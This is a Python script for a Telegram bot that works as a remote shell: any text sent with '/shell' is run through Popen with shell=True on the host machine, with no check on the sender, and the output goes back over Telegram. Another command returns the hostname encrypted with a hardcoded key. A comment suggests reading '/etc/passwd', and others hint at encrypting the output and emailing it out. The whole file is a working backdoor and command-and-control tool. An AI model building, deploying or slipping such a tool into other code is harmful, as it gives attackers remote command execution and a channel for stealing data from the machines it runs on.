from logging import exception
from telegram import message
from telegram.ext.updater import Updater
from telegram.update import Update
from telegram.ext.callbackcontext import CallbackContext
from telegram.ext.commandhandler import CommandHandler
from telegram.ext.messagehandler import MessageHandler
from telegram.ext.filters import Filters
import cryptocode
import subprocess
from subprocess import Popen, PIPE
import socket
#My random key for end to end encrypt
key = "strongKey"
#My Telegram API
apikey="yourAPIKey"


hostname = socket.gethostname()


"""
1. Create Telegram bot:
2. Open Telegram and search for Botfather
3. Send /newbot
4. Send a name like test_bot
5. Get de token api and put in apikey script 


Tips:
Get passwd first lines: head -20 /etc/passwd
"""

updater = Updater(apikey,
                  use_context=True)

def start(update: Update, context: CallbackContext):
    update.message.reply_text(
        "Hello , i'm a simple shell type shell then command")
  
def CommmandToRun (update: Update, context: CallbackContext):
    encoded = cryptocode.encrypt(hostname,key)
    update.message.reply_text("Current hostname:" + encoded)
    print (f"***Command: {hostname} -->Send to Client")
  
  
def unknown(update: Update, context: CallbackContext):
    update.message.reply_text(
        "Sorry '%s' is not a valid command" % update.message.text)
  
 
#Simple shell  (Remember, Telegram has a maximum number of characters)


def shell(update, context):
 try:
    UserInput = " ".join(context.args)
    cmd = UserInput
    p = Popen(cmd , shell=True,universal_newlines=True, stdout=PIPE, stderr=PIPE)
    out, err = p.communicate()
    #If you want send encrypt file used this: 
    #cryptocode.encrypt(hostname,key)

    update.message.reply_text(str(out.rstrip()))
    #update.message.reply_text(str(out.rstrip()))
    print (f"***Command: {UserInput} -->Send to Client: {out.rstrip()}")

 except Exception as e:
  print(f"Error log: {e}")
 

    #Maybe send this encrypt to a email :)


updater.dispatcher.add_handler(CommandHandler("shell", shell))
updater.dispatcher.add_handler(CommandHandler('command', CommmandToRun))
updater.dispatcher.add_handler(CommandHandler('start',start))

updater.dispatcher.add_handler(MessageHandler(Filters.text, unknown))
updater.dispatcher.add_handler(MessageHandler(
    Filters.command, unknown))  # Filters out unknown commands

  
# Filters out unknown messages.

 
updater.start_polling()
  

   
